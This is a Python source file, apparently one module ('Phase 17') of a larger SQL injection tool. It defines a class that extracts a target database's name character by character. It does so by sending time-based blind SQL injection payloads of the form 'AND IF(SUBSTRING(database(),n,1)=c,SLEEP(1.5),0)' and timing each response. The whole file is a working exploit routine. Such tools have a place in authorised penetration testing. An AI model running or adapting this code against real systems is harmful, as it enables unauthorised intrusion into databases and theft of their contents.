import time


class BlindSQLiExtractor:
    """
    Phase 17 – Blind SQL Injection Extractor

    Purpose:
    - Extract metadata ONLY when SQLi is CONFIRMED
    - Supports time-based and boolean-based blind SQLi
    - Extremely slow by design
    - Zero false positives

    Current Capabilities:
    - Database name extraction (char-by-char)
    """

    # ---------------- CONFIG ----------------
    SLEEP_TIME = 1.5
    THRESHOLD = 1.2
    MAX_LENGTH = 30
    CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@.-"

    def __init__(self, requester):
        self.requester = requester

    # ==================================================
    # PUBLIC API
    # ==================================================
    def extract_db_name(self, point):
        """
        Extract database name using time-based inference.
        """

        name = ""
        print("[*] Blind extracting database name")

        for position in range(1, self.MAX_LENGTH + 1):
            found = False

            for char in self.CHARSET:
                if self._time_based_check(point, position, char):
                    name += char
                    print(f"[+] Found char {position}: {char}")
                    found = True
                    break

            if not found:
                break

        return name if name else None

    # ==================================================
    # INTERNAL HELPERS
    # ==================================================
    def _time_based_check(self, point, position, char):
        """
        Tests a single character using time delay.
        """

        payload = (
            f" AND IF(SUBSTRING(database(),{position},1)='{char}',"
            f"SLEEP({self.SLEEP_TIME}),0)"
        )

        start = time.time()
        response = self.requester.send(point.inject(payload))
        elapsed = time.time() - start

        return response and elapsed > self.THRESHOLD